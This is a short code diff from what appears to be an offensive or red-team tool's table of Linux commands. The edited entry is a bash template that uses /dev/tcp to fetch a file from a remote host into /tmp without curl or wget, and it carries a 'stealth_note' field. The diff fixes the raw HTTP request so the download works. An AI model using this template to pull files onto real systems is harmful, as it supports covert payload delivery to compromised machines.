@@ -49,7 +49,7 @@ LINUX_COMMANDS = {
             binary="bash",
             template=(
                 "exec 3<>/dev/tcp/{ip}/{port}; "
-                "echo -e 'GET /{filename} HTTP/1.0\\r\\nHost: {ip}\\r\\n' >&3; "
+                "echo -e 'GET /{filename} HTTP/1.0\\r\\nHost: {ip}\\r\\n\\r\\n' >&3; "
                 "cat <&3 > /tmp/{filename}"
             ),
             stealth_note=(
